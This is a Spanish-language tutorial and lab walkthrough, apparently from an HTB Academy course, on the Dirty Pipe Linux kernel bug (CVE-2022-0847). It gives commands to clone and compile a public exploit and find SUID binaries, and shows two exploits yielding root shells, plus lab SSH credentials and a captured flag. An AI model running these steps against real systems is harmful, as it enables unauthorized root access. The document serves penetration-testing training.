
# Dirty Pipe

## <mark style="color:purple;">Dirty Pipe</mark>

Una vulnerabilidad en el kernel de Linux, denominada [Dirty Pipe](https://dirtypipe.cm4all.com/) ( [CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847) ), permite la escritura no autorizada en archivos de usuarios root en Linux. Técnicamente, la vulnerabilidad es similar a la vulnerabilidad [Dirty Cow](https://dirtycow.ninja/) descubierta en 2016. Todos los kernels desde la versión `5.8` hasta `5.17` están afectados y son vulnerables a esta vulnerabilidad.

En términos simples, esta vulnerabilidad permite a un usuario escribir en archivos arbitrarios siempre que tenga acceso de lectura a dichos archivos. También es interesante señalar que los teléfonos Android también se ven afectados. Las aplicaciones de Android se ejecutan con derechos de usuario, por lo que una aplicación maliciosa o comprometida podría tomar el control del teléfono.

Esta vulnerabilidad se basa en tuberías o pipes (de ahí su nombre). Las tuberías son un mecanismo de comunicación unidireccional entre procesos que son especialmente populares en los sistemas Unix. Por ejemplo, podríamos editar el archivo `/etc/passwd` y eliminar la solicitud de contraseña para el usuario root. Esto nos permitiría iniciar sesión con el comando `su` sin la solicitud de contraseña.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) y compilarlo en el propio sistema de destino o en una copia que hayamos hecho.

{% hint style="info" %}
**Importante**: Debemos compilar siempre los ejecutables en LA MÁQUINA OBJETIVO
{% endhint %}

### **1. Descargar Exploit de Dirty Pipe**

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

Después de compilar el código, tenemos dos exploits diferentes disponibles. La primera versión del exploit ( `exploit-1`) modifica el `/etc/passwd`y nos da un mensaje con privilegios de root. Para esto, necesitamos verificar la versión del kernel y luego ejecutar el exploit.

### **2. Verificar la versión del kernel**

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

### **3. Explotación**

```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

Con la ayuda de la segunda versión del exploit ( `exploit-2`), podemos ejecutar binarios SUID con privilegios de root. Sin embargo, antes de poder hacerlo, primero debemos encontrar estos binarios SUID. Para ello, podemos utilizar el siguiente comando:

### **4. Encontrar binarios SUID**

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Luego podemos elegir un binario y especificar la ruta completa del binario como argumento para el exploit y ejecutarlo.

### **4. Explotación 2.0**

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.177.59 (ACADEMY-LLPE-DIRTY)
Usuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

Aumente los privilegios y envíe el contenido de flag.txt como respuesta.

Al acceder por SSH no enocntramos archivos relevantes ni tenemos permisos de ejecución en la máquina:

```shell-session
htb-student@ubuntu:~$ ls
htb-student@ubuntu:~$ sudo -l
[sudo] password for htb-student: 
Sorry, user htb-student may not run sudo on ubuntu.
```

Al verificar la versión del Kernel vemos que es vulnerable a Dirty Pipe, ya que todos los kernels desde la versión `5.8` hasta `5.17` están afectados y son vulnerables a esta vulnerabilidad.:

```shell-session
htb-student@ubuntu:~$ uname -r
5.15.0-051500-generic
```

Como la máquina objetivo no tiene conectividad a internet, vamos a descargarnos el exploit en local, enviarlo a la máquina y compilarlo:

```shell-session
afsh4ck@kali$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

```shell-session
afsh4ck@kali$ scp -r CVE-2022-0847-DirtyPipe-Exploits htb-student@10.129.177.59:/home/htb-student/
```

<figure><img src="/files/owKadAu0Bmv0C0anHqH0" alt=""><figcaption></figcaption></figure>

### Exploit 1

```bash
htb-student@ubuntu:~/CVE-2022-0847-DirtyPipe-Exploits$ ./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cd /root
ls
flag.txt  snap
cat flag.txt
HTB{D1rTy_DiR7Y}
```

### Exploit 2

Con la ayuda de la segunda versión del exploit ( `exploit-2`), podemos ejecutar binarios SUID con privilegios de root. Sin embargo, antes de poder hacerlo, primero debemos encontrar estos binarios SUID. Para ello, podemos utilizar el siguiente comando:

```shell-session
htb-student@ubuntu:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/at
/usr/bin/chfn
<----SNIP---->
```

```shell-session
htb-student@ubuntu:~/CVE-2022-0847-DirtyPipe-Exploits$ ./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1000(htb-student)
```
